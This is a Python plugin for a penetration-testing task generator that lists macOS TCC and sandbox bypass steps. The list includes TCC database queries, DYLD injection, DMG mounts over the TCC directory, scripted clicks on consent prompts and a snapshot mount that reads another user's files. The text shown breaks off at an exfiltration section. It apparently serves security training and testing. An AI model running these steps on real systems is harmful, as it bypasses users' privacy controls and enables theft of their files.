"""
macOS Sandbox & TCC Bypass enumeration plugin

Generates tasks for macOS privilege escalation via Sandbox and TCC (Transparency, Consent, and Control) bypasses including:
- Sandbox escape techniques
- TCC database manipulation
- Permission bypass methods
- Apple Events abuse
- Entitlement exploitation
- Process injection for privilege escalation

Extracted from HackTricks: macos-sandbox/ and macos-tcc/ directories
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class MacOSSandboxBypassPlugin(ServicePlugin):
    """macOS Sandbox and TCC bypass enumeration plugin"""

    @property
    def name(self) -> str:
        return "macos-sandbox-bypass"

    @property
    def default_ports(self) -> List[int]:
        return []  # This is OS-level, not port-based

    @property
    def service_names(self) -> List[str]:
        return ['macos', 'darwin', 'osx']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect macOS systems"""
        ostype = port_info.get('ostype', '').lower()
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()

        # Check for macOS indicators
        if any(indicator in ostype for indicator in ['darwin', 'macos', 'mac os']):
            return True

        if any(indicator in service for indicator in ['apple', 'osx', 'macos']):
            return True

        if any(indicator in product for indicator in ['apple', 'darwin']):
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate macOS Sandbox & TCC bypass task tree"""

        tasks = {
            'id': 'macos-sandbox-tcc-bypass',
            'name': f'macOS Sandbox & TCC Bypass Enumeration ({target})',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: TCC Database Enumeration
        tcc_tasks = {
            'id': 'tcc-enumeration',
            'name': 'TCC Database Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'tcc-user-db-query',
                    'name': 'Query User TCC Database',
                    'type': 'command',
                    'metadata': {
                        'command': f'ssh {target} "sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db \\"SELECT service, client, auth_value, auth_reason FROM access;\\""',
                        'description': 'Enumerate granted/denied TCC permissions in user database',
                        'tags': ['OSCP:HIGH', 'ENUM', 'MACOS', 'QUICK_WIN'],
                        'flag_explanations': {
                            'sqlite3': 'SQLite database query tool',
                            '~/Library/Application Support/com.apple.TCC/TCC.db': 'User TCC permissions database',
                            'SELECT service, client, auth_value, auth_reason': 'Query permission grants (auth_value: 0=denied, 2=allowed)'
                        },
                        'success_indicators': [
                            'Rows returned with service names (kTCCService*)',
                            'auth_value shows granted permissions (2)',
                            'Client bundle IDs or paths visible'
                        ],
                        'failure_indicators': [
                            'Permission denied (TCC itself protects read access)',
                            'Database locked',
                            'No such file or directory'
                        ],
                        'next_steps': [
                            'Identify apps with Full Disk Access (kTCCServiceSystemPolicyAllFiles)',
                            'Look for Automation permissions (kTCCServiceAppleEvents)',
                            'Check for Screen Recording (kTCCServiceScreenCapture)',
                            'Target apps with FDA for privilege escalation'
                        ],
                        'alternatives': [
                            f'Manual: scp {target}:~/Library/Application\\ Support/com.apple.TCC/TCC.db /tmp/tcc-user.db',
                            'Use DB browser tools if SSH unavailable',
                            'Check System Preferences > Security & Privacy > Privacy for UI view'
                        ],
                        'notes': 'TCC database requires FDA to read. If blocked, try system TCC DB or alternative methods.'
                    }
                },
                {
                    'id': 'tcc-system-db-query',
                    'name': 'Query System TCC Database',
                    'type': 'command',
                    'metadata': {
                        'command': f'ssh {target} "sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \\"SELECT service, client, auth_value FROM access WHERE service=\'kTCCServiceSystemPolicyAllFiles\' AND auth_value=2;\\""',
                        'description': 'Enumerate apps with Full Disk Access from system TCC database',
                        'tags': ['OSCP:HIGH', 'ENUM', 'MACOS'],
                        'flag_explanations': {
                            '/Library/Application Support/com.apple.TCC/TCC.db': 'System-wide TCC database (SIP protected)',
                            'WHERE service=kTCCServiceSystemPolicyAllFiles': 'Filter for Full Disk Access permissions',
                            'AND auth_value=2': 'Only show allowed permissions'
                        },
                        'success_indicators': [
                            'List of apps with FDA returned',
                            'Terminal.app or iTerm often present',
                            'Third-party apps visible'
                        ],
                        'failure_indicators': [
                            'Permission denied (SIP protection)',
                            'Requires root + SIP bypass',
                            'Database not found'
                        ],
                        'next_steps': [
                            'Target FDA apps for injection/abuse',
                            'Check if SSH has FDA (legacy default)',
                            'Look for plugin injection opportunities'
                        ],
                        'alternatives': [
                            'tccutil command-line utility (limited)',
                            'Check /var/db/locationd/clients.plist for location services',
                            'Examine MDMOverrides.plist if accessible'
                        ],
                        'notes': 'System TCC DB is SIP+TCC protected. Need elevated privileges.'
                    }
                },
                {
                    'id': 'tcc-location-services',
                    'name': 'Check Location Services TCC',
                    'type': 'command',
                    'metadata': {
                        'command': f'ssh {target} "plutil -p /var/db/locationd/clients.plist 2>/dev/null || echo \\"Permission denied\\""',
                        'description': 'Enumerate location services permissions (separate TCC database)',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MACOS'],
                        'flag_explanations': {
                            'plutil -p': 'Print plist in human-readable format',
                            '/var/db/locationd/clients.plist': 'Location services permission database',
                            '2>/dev/null': 'Suppress error messages'
                        },
                        'success_indicators': [
                            'List of apps with location access',
                            'Authorization status visible',
                            'Client identifiers shown'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'File not readable',
                            'Location services disabled'
                        ],
                        'next_steps': [
                            'Mount DMG over /var/db/locationd/ if writable',
                            'Check for location-aware apps to abuse',
                            'Verify location services enabled'
                        ],
                        'alternatives': [
                            'Check System Preferences > Privacy > Location Services',
                            'Use CoreLocation framework directly',
                            'Examine app entitlements for com.apple.security.personal-information.location'
                        ],
                        'notes': 'Location DB historically not protected from DMG mounting'
                    }
                },
                {
                    'id': 'tcc-entitlements-check',
                    'name': 'Check App Entitlements',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Examine application entitlements for TCC bypass opportunities',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'RESEARCH'],
                        'alternatives': [
                            f'ssh {target} "codesign -d --entitlements :- /Applications/TARGET.app"',
                            'Look for com.apple.security.cs.disable-library-validation',
                            'Check for com.apple.security.cs.allow-dyld-environment-variables',
                            'Find com.apple.private.tcc.allow entitlements',
                            'Identify apps with com.apple.security.get-task-allow'
                        ],
                        'notes': 'Entitlements like disable-library-validation enable DYLD injection. Private TCC entitlements grant permissions without prompts.'
                    }
                }
            ]
        }
        tasks['children'].append(tcc_tasks)

        # PHASE 2: Sandbox Enumeration
        sandbox_tasks = {
            'id': 'sandbox-enumeration',
            'name': 'Sandbox Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'sandbox-profiles-list',
                    'name': 'List Sandbox Profiles',
                    'type': 'command',
                    'metadata': {
                        'command': f'ssh {target} "ls -la /usr/share/sandbox/ /System/Library/Sandbox/Profiles/"',
                        'description': 'Enumerate system sandbox profiles to understand restrictions',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MACOS', 'QUICK_WIN'],
                        'flag_explanations': {
                            '/usr/share/sandbox/': 'System service sandbox profiles',
                            '/System/Library/Sandbox/Profiles/': 'Application sandbox profiles',
                            'ls -la': 'List all files with details'
                        },
                        'success_indicators': [
                            'application.sb (App Store app profile)',
                            'Service-specific profiles (mdnsresponder, etc)',
                            'Profile files readable'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Directory not found',
                            'Empty output'
                        ],
                        'next_steps': [
                            'Read application.sb to understand App Store restrictions',
                            'Check custom profiles for third-party apps',
                            'Look for entitlements that bypass restrictions'
                        ],
                        'alternatives': [
                            'Check rootless.conf for SIP sandbox profile',
                            'Use sandbox-exec -p to test profiles',
                            'Examine app containers in ~/Library/Containers/'
                        ],
                        'notes': 'Sandbox profiles use Scheme-based SBPL language. Platform profile (SIP) is in rootless.conf.'
                    }
                },
                {
                    'id': 'sandbox-container-check',
                    'name': 'Check Sandbox Containers',
                    'type': 'command',
                    'metadata': {
                        'command': f'ssh {target} "ls -l ~/Library/Containers/ | head -20"',
                        'description': 'List sandboxed app containers to identify targets',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MACOS', 'QUICK_WIN'],
                        'flag_explanations': {
                            '~/Library/Containers/': 'Sandboxed app containers directory',
                            'ls -l': 'List with permissions',
                            'head -20': 'Show first 20 entries'
                        },
                        'success_indicators': [
                            'Container directories listed (com.company.appname)',
                            'Permissions visible (drwx------)',
                            'Recent modification times'
                        ],
                        'failure_indicators': [
                            'Empty directory',
                            'Permission denied',
                            'No sandboxed apps installed'
                        ],
                        'next_steps': [
                            'Examine .com.apple.containermanagerd.metadata.plist in each',
                            'Check RedirectablePaths for accessible locations',
                            'Look for SandboxProfileData (compiled profile)',
                            'Identify apps with useful entitlements'
                        ],
                        'alternatives': [
                            'Use plutil on metadata plist files',
                            'Check Data/ subdirectory structure',
                            'Look for symlinks to user directories'
                        ],
                        'notes': 'Containers mimic HOME structure but sandboxed. Symlinks present but require permissions to access.'
                    }
                },
                {
                    'id': 'sandbox-check-tool',
                    'name': 'Test Sandbox Restrictions (sbtool)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use sbtool to check specific sandbox permissions for PIDs',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'MACOS'],
                        'alternatives': [
                            f'ssh {target} "sbtool <pid> file /tmp"  # Check file access',
                            'sbtool <pid> mach  # Check Mach port access',
                            'sbtool <pid> inspect  # Get sandbox profile explanation',
                            'sbtool <pid> all  # Check all permissions'
                        ],
                        'notes': 'sbtool uses sandbox_check syscall to verify permissions. Useful for pre-exploitation testing.'
                    }
                }
            ]
        }
        tasks['children'].append(sandbox_tasks)

        # PHASE 3: TCC Bypass Techniques
        tcc_bypass_tasks = {
            'id': 'tcc-bypass-techniques',
            'name': 'TCC Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': 'tcc-automation-finder-abuse',
                    'name': 'Abuse Automation Permission on Finder',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use Automation (kTCCServiceAppleEvents) over Finder to access FDA-protected files',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'Create AppleScript to make Finder copy TCC.db',
                            'Use: tell application "Finder" to duplicate file...',
                            'Target: Copy ~/Library/Application Support/com.apple.TCC/TCC.db to /tmp',
                            'Finder has FDA by default (not shown in UI)',
                            'Requires Automation permission over com.apple.Finder'
                        ],
                        'notes': 'Finder always has FDA. If you control app with Automation on Finder, abuse it to copy TCC DB.'
                    }
                },
                {
                    'id': 'tcc-synthetic-clicks',
                    'name': 'Synthetic Click on TCC Prompts',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use Accessibility (kTCCServiceAccessibility) to programmatically click TCC allow buttons',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'Requires Accessibility permission first',
                            'Use CGEventCreateKeyboardEvent to simulate Enter key',
                            'Monitor for TCC prompt appearance (SecurityAgent)',
                            'Auto-click "Always Allow" button',
                            'Can bypass TCC for other apps'
                        ],
                        'notes': 'Accessibility is very powerful - enables keylogging, UI automation, TCC bypasses.'
                    }
                },
                {
                    'id': 'tcc-home-variable-exploit',
                    'name': 'HOME Environment Variable TCC Bypass (CVE-2020-9934)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Manipulate HOME env var to point tccd to attacker-controlled TCC database',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'CVE'],
                        'alternatives': [
                            'launchctl setenv HOME /tmp/fake_home',
                            'mkdir -p /tmp/fake_home/Library/Application\\ Support/com.apple.TCC',
                            'Create malicious TCC.db with full permissions',
                            'launchctl stop/start com.apple.tccd',
                            'tccd loads TCC.db from new $HOME'
                        ],
                        'notes': 'Patched. tccd is launchd daemon vulnerable to env manipulation. Historical CVE.'
                    }
                },
                {
                    'id': 'tcc-mount-dmg-bypass',
                    'name': 'Mount DMG Over TCC Directory (CVE-2021-1784)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Mount custom DMG with malicious TCC.db over protected TCC directory',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'CVE'],
                        'alternatives': [
                            'hdiutil create /tmp/tcc.dmg -size 2m -fs APFS',
                            'hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tcc.dmg',
                            'Create fake TCC.db in mounted volume',
                            'hdiutil detach /tmp/mnt',
                            'hdiutil attach -owners off -mountpoint ~/Library/Application\\ Support/com.apple.TCC /tmp/tcc.dmg',
                            'TCC reads from mounted DB instead of real one'
                        ],
                        'notes': 'Patched. Allowed arbitrary mounts over TCC DB locations. Historical CVE.'
                    }
                },
                {
                    'id': 'tcc-nfshome-manipulation',
                    'name': 'NFSHomeDirectory Attribute Manipulation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Modify user NFSHomeDirectory attribute to control TCC database location',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'Requires kTCCServiceSystemPolicySysAdminFiles permission',
                            'Use dsexport/dsimport to modify user home',
                            'Point HOME to attacker-controlled directory',
                            'Plant fake TCC.db',
                            'Restart tccd to load fake database'
                        ],
                        'notes': 'Powerful if you compromise app with SysAdminFiles permission. CVE-2020-27937, CVE-2021-30970.'
                    }
                },
                {
                    'id': 'tcc-sqlite-env-abuse',
                    'name': 'SQLite Environment Variable Abuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Abuse SQLITE_* environment variables to log or manipulate TCC database access',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'SQLITE_AUTO_TRACE=1: Log all SQL queries from apps using libsqlite3',
                            'SQLITE_SQLLOG_DIR=/path: Copy opened DBs to path',
                            'MTL_DUMP_PIPELINES_TO_JSON_FILE: Metal framework file write (CVE-2023-32407)',
                            'Can leak TCC-protected data or manipulate writes'
                        ],
                        'notes': 'Many Apple apps use libsqlite3. Env vars can leak or manipulate DB access. Mostly patched.'
                    }
                }
            ]
        }
        tasks['children'].append(tcc_bypass_tasks)

        # PHASE 4: Sandbox Escape Techniques
        sandbox_escape_tasks = {
            'id': 'sandbox-escape-techniques',
            'name': 'Sandbox Escape Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': 'sandbox-dylib-injection',
                    'name': 'DYLD Library Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject malicious dylib into app with disable-library-validation entitlement',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'INJECTION'],
                        'alternatives': [
                            'Find apps with com.apple.security.cs.disable-library-validation',
                            'Check for com.apple.security.cs.allow-dyld-environment-variables',
                            'DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/app',
                            'Malicious dylib executes in app context',
                            'Inherits app TCC permissions'
                        ],
                        'notes': 'Firefox, Telegram (CVE-2023-26818) had these entitlements. Very powerful for TCC bypass.'
                    }
                },
                {
                    'id': 'sandbox-plugin-injection',
                    'name': 'Plugin/Extension Loading Abuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Load malicious plugins into apps that load extensions from writable locations',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'INJECTION'],
                        'alternatives': [
                            'HAL Audio Plugins: /Library/Audio/Plug-Ins/HAL/ (CVE-2020-29621 - coreaudiod)',
                            'DAL Camera Plugins: /Library/CoreMediaIO/Plug-Ins/DAL/',
                            'Directory Utility plugins: *.daplug (CVE-2020-27937)',
                            'Store malicious library in plugin directory',
                            'App loads and executes in privileged context'
                        ],
                        'notes': 'Apps with plugin loading + hardened runtime disabled. Inherits app TCC/FDA permissions.'
                    }
                },
                {
                    'id': 'sandbox-xpc-service-abuse',
                    'name': 'Abuse Privileged XPC Services',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Call XPC services with elevated privileges from sandbox',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'Enumerate XPC services: /System/Library/xpc/launchd.plist',
                            'Check System/User Mach services available in sandbox',
                            'Test bootstrap_look_up for service availability',
                            'Historical examples: storagekitfsrunner (arbitrary command execution)',
                            'AudioAnalyticsHelperService (zip creation without quarantine)',
                            'ShortcutsFileAccessHelper (FDA extension grants)'
                        ],
                        'notes': 'PID Domain XPC services visible to sandboxed apps. Some had no authentication. Mostly patched.'
                    }
                },
                {
                    'id': 'sandbox-app-folder-exploit',
                    'name': 'Create Unsandboxed .app Bundle',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create .app folder without quarantine attribute to escape sandbox via open',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'Create folder ending in .app without quarantine attribute',
                            'CVE-2023-32364: Mount technique to create unquarantined .app',
                            'Point main executable to /bin/bash',
                            'Add environment variables in Info.plist',
                            'Use open command to launch (bypasses quarantine check)',
                            'macOS only checks quarantine on .app folder and main executable'
                        ],
                        'notes': 'If you can create .app without quarantine, can escape. Mount, zip tricks historically worked.'
                    }
                },
                {
                    'id': 'sandbox-launch-agent-persistence',
                    'name': 'Launch Agent Persistence Escape',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Place malicious LaunchAgent to execute outside sandbox on login',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'PERSISTENCE', 'MACOS'],
                        'alternatives': [
                            'Write to ~/Library/LaunchAgents/ (if permitted)',
                            'MS Office bypass: Filename starting with ~$ allowed',
                            'Create Login Item pointing to zip (unzips to LaunchAgents)',
                            'Use .zshenv or .bash_profile via Login Items + Terminal',
                            'LaunchAgent executes unsandboxed on user login'
                        ],
                        'notes': 'MS Office sandbox allowed ~$ filenames. Multiple historical Office bypasses via Login Items.'
                    }
                },
                {
                    'id': 'sandbox-open-env-abuse',
                    'name': 'Abuse open Command with --env',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use open --env to set environment variables for spawned apps',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'Create .zshenv file inside sandbox container',
                            'open --env HOME=/sandbox/path Terminal.app',
                            'Terminal executes .zshenv from fake HOME',
                            'Can also use --stdin to pass scripts to interpreters',
                            'open --stdin=exploit.py Python.app (bypasses quarantine)'
                        ],
                        'notes': 'open utility can launch apps with custom env vars. Python won\'t check quarantine on stdin.'
                    }
                },
                {
                    'id': 'sandbox-interpose-bypass',
                    'name': 'Function Interposing to Prevent Sandbox',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Interpose _libsecinit_initializer or __mac_syscall to prevent sandbox activation',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'ADVANCED'],
                        'alternatives': [
                            'Create interpose dylib hooking _libsecinit_initializer',
                            'Or hook __mac_syscall to block Sandbox policy=0 call',
                            'DYLD_INSERT_LIBRARIES=interpose.dylib ./sandboxed_app',
                            'Sandbox never activates',
                            'Requires app to allow DYLD env vars'
                        ],
                        'notes': 'Sandbox applied from userland. Interposing can prevent activation if DYLD injection possible.'
                    }
                },
                {
                    'id': 'sandbox-lldb-bypass',
                    'name': 'Debug and Bypass Sandbox with LLDB',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use debugger to skip sandbox activation syscall',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MACOS', 'DEBUG'],
                        'alternatives': [
                            'lldb ./sandboxed_binary',
                            'breakpoint set --name __mac_syscall --condition \'($x1 == 0)\'',
                            'Run until sandbox activation (policy=0 call)',
                            'Jump past syscall: register write $pc <after_address>',
                            'Set registers to fake success',
                            'Continue execution unsandboxed'
                        ],
                        'notes': 'Educational technique. Requires debugger attachment. Not practical for most exploits but demonstrates sandbox activation.'
                    }
                }
            ]
        }
        tasks['children'].append(sandbox_escape_tasks)

        # PHASE 5: Process Injection & Privilege Escalation
        process_injection_tasks = {
            'id': 'process-injection-privesc',
            'name': 'Process Injection for Privilege Escalation',
            'type': 'parent',
            'children': [
                {
                    'id': 'inject-terminal-fda',
                    'name': 'Inject into Terminal/iTerm (FDA)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject code into Terminal.app or iTerm to abuse Full Disk Access',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'INJECTION', 'MACOS'],
                        'alternatives': [
                            'Terminal often has FDA by default',
                            'Use DYLD injection if entitlements permit',
                            'Use Automation to control Terminal via AppleScript',
                            'Load malicious .terminal script files',
                            'Inject to copy TCC databases, sensitive files'
                        ],
                        'notes': 'Terminal with FDA is common target. AppleScript control powerful if Automation granted.'
                    }
                },
                {
                    'id': 'inject-music-tv-apps',
                    'name': 'Inject into Music/TV Apps (CVE-2023-38571)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit Music.app auto-import race condition to write files',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MACOS', 'CVE'],
                        'alternatives': [
                            'Music auto-imports files to ~/Music/Music/Media.localized/Automatically Add to Music.localized/',
                            'Uses rename(a,b) vulnerable to race condition',
                            'Drop fake TCC.db in auto-import folder',
                            'Race condition: delete b, symlink to ~/Library/Application Support/com.apple.TCC/',
                            'Music overwrites real TCC.db'
                        ],
                        'notes': 'Patched CVE. Race condition in file rename allowed TCC.db overwrite.'
                    }
                },
                {
                    'id': 'inject-finder-automation',
                    'name': 'Control Finder via Automation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use Automation permission over Finder to access FDA files',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'Finder has implicit FDA',
                            'AppleScript: tell application "Finder" to duplicate file...',
                            'Can copy any file Finder can access (all user files)',
                            'Cannot execute arbitrary code in Finder',
                            'Use for exfiltration of TCC DB, credentials, etc.'
                        ],
                        'notes': 'Automation on Finder = read-only FDA. Can\'t execute code but can copy all files.'
                    }
                },
                {
                    'id': 'inject-automator-control',
                    'name': 'Control Automator to Control Other Apps',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Automator has broad Automation permissions - chain to control Finder',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'CHAIN'],
                        'alternatives': [
                            'Automator.app has kTCCServiceAppleEvents for many apps',
                            'Can control Finder, Terminal, other privileged apps',
                            'AppleScript: tell Automator to create workflow, execute shell script',
                            'Chain: Control Automator → Control Finder → Access FDA files',
                            'Requires Automation over Automator first'
                        ],
                        'notes': 'Automator is pivot point. Automation over Automator grants transitive Automation to its targets.'
                    }
                },
                {
                    'id': 'inject-system-events-folder-actions',
                    'name': 'System Events Folder Actions for File Access',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use System Events to create Folder Actions that access TCC-protected folders',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'System Events can create Folder Actions',
                            'Folder Actions can access Desktop/Documents/Downloads',
                            'Create script in ~/Library/Scripts/Folder Action Scripts/',
                            'Attach to monitored folder (~/Desktop)',
                            'File operations trigger script with TCC access'
                        ],
                        'notes': 'Folder Actions have special TCC permissions. System Events can create them.'
                    }
                }
            ]
        }
        tasks['children'].append(process_injection_tasks)

        # PHASE 6: Apple Events & AppleScript Abuse
        apple_events_tasks = {
            'id': 'apple-events-abuse',
            'name': 'Apple Events & AppleScript Abuse',
            'type': 'parent',
            'children': [
                {
                    'id': 'applescript-enumerate-apps',
                    'name': 'Enumerate Controllable Applications',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify which apps can be controlled via AppleScript/Automation',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MACOS'],
                        'alternatives': [
                            'Check TCC DB for kTCCServiceAppleEvents permissions',
                            'Query appleeventsd for registered apps',
                            'Test: osascript -e \'tell application "AppName" to activate\'',
                            'AEDebugSends=1 for Apple Event logging',
                            'Look for apps exposing scripting interfaces'
                        ],
                        'notes': 'Sandboxed apps need allow appleevent-send. Check entitlements for restrictions.'
                    }
                },
                {
                    'id': 'applescript-iterm-control',
                    'name': 'Control iTerm via AppleScript',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use AppleScript to execute commands in iTerm with its permissions',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'tell application "iTerm" to activate',
                            'tell current window to create tab',
                            'tell current session to write text "cp ~/Desktop/private.txt /tmp"',
                            'iTerm executes command with its TCC permissions',
                            'If iTerm has FDA, command has FDA'
                        ],
                        'notes': 'AppleScript can control Terminal, iTerm if Automation granted. Powerful privilege escalation vector.'
                    }
                },
                {
                    'id': 'applescript-keystrokes-abuse',
                    'name': 'Keystroke Injection via System Events',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use Automation on System Events + Accessibility to send keystrokes',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'Requires: Automation on System Events + kTCCServiceAccessibility',
                            'tell application "System Events" to keystroke "cmd+g"',
                            'Can automate Finder file operations',
                            'Navigate to folders, copy files, overwrite TCC.db',
                            'Chain with Finder automation for full control'
                        ],
                        'notes': 'Combination of Automation(System Events) + Accessibility = full UI automation. Very powerful.'
                    }
                },
                {
                    'id': 'applescript-click-tcc-prompts',
                    'name': 'Auto-Click TCC Prompts',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use Accessibility to programmatically accept TCC prompts',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'Requires kTCCServiceAccessibility',
                            'Monitor for SecurityAgent TCC prompt',
                            'CGEventCreateKeyboardEvent to simulate Enter key',
                            'tell window 1 of process "SecurityAgent" to click button "Always Allow"',
                            'Bypass user interaction requirement'
                        ],
                        'notes': 'Accessibility permission allows clicking TCC buttons. Can escalate to other permissions.'
                    }
                },
                {
                    'id': 'applescript-decompile-analysis',
                    'name': 'Analyze Compiled AppleScripts',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Decompile and analyze suspicious AppleScript files',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'MACOS'],
                        'alternatives': [
                            'osadecompile script.scpt  # For normal compiled scripts',
                            'applescript-disassembler for "read-only" scripts',
                            'aevt_decompile for malicious scripts',
                            'Check for privilege escalation attempts',
                            'Look for TCC bypass techniques'
                        ],
                        'notes': 'Read-only AppleScripts can\'t be decompiled with osadecompile. Need specialized tools.'
                    }
                }
            ]
        }
        tasks['children'].append(apple_events_tasks)

        # PHASE 7: Mounting & Filesystem Attacks
        mount_attacks_tasks = {
            'id': 'mount-filesystem-attacks',
            'name': 'Mounting & Filesystem Attacks',
            'type': 'parent',
            'children': [
                {
                    'id': 'mount-timemachine-snapshot',
                    'name': 'Mount Time Machine Snapshot (CVE-2020-9771)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Mount Time Machine snapshot to bypass file permissions',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'CVE'],
                        'flag_explanations': {
                            'tmutil localsnapshot': 'Create local Time Machine snapshot',
                            'tmutil listlocalsnapshots /': 'List available snapshots',
                            'mount_apfs -o noowners': 'Mount without owner enforcement (current user owns all files)',
                            '-s com.apple.TimeMachine.TIMESTAMP.local': 'Specify snapshot to mount',
                            '/System/Volumes/Data': 'Source volume',
                            '/tmp/snap': 'Mount point'
                        },
                        'alternatives': [
                            'tmutil localsnapshot  # Create snapshot',
                            'tmutil listlocalsnapshots /  # List snapshots',
                            'mkdir /tmp/snap',
                            'mount_apfs -o noowners -s com.apple.TimeMachine.TIMESTAMP.local /System/Volumes/Data /tmp/snap',
                            'ls /tmp/snap/Users/victim_user  # Access all files',
                            'Requires Terminal with FDA'
                        ],
                        'notes': 'Patched CVE. noowners option mounted files owned by current user, bypassing all permissions.'
                    }
                },
                {
                    'id': 'mount-asr-disk-copy',
                    'name': 'Use ASR to Copy Disk Bypassing TCC',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Apple Software Restore (asr) can copy entire volumes bypassing TCC',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MACOS'],
                        'flag_explanations': {
                            'asr': 'Apple Software Restore - disk imaging utility',
                            'restore': 'Restore/copy disk image',
                            '--source': 'Source disk or volume',
                            '--target': 'Destination location',
                            '--erase': 'Erase destination before restore'
                        },
                        'alternatives': [
                            'asr can copy full disks/volumes',
                            'Has entitlements to bypass some TCC restrictions',
                            'Can clone entire user directory',
                            'Mount clone to access TCC-protected files'
                        ],
                        'notes': 'asr has special entitlements. Can sometimes bypass protections when copying volumes.'
                    }
                },
                {
                    'id': 'mount-diskarbitration-bypass',
                    'name': 'Disk Arbitration Bypass (CVE-2024-40855)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass disk arbitration checks to mount over TCC directories',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'CVE'],
                        'alternatives': [
                            'Call diskarbitrationd directly (bypass public API)',
                            'Use ../ path elements in mount paths',
                            'Mount over TCC database location',
                            'diskarbitrationd has com.apple.private.security.storage-exempt.heritable'
                        ],
                        'notes': 'Patched. Direct XPC to diskarbitrationd bypassed path validation. Could mount over TCC DB.'
                    }
                },
                {
                    'id': 'mount-create-unquarantined-app',
                    'name': 'Create .app Without Quarantine via Mount',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use mounting techniques to create .app bundles without quarantine attribute',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            'Create .app structure on mounted volume',
                            'Point Contents/MacOS/executable to /bin/bash',
                            'Add environment variables in Info.plist',
                            'Unmount preserving no-quarantine state',
                            'open Application.app executes unsandboxed'
                        ],
                        'notes': 'CVE-2023-32364 and variants. If .app lacks quarantine, can escape sandbox via open.'
                    }
                }
            ]
        }
        tasks['children'].append(mount_attacks_tasks)

        # PHASE 8: TCC Payloads & Data Exfiltration
        tcc_payloads_tasks = {
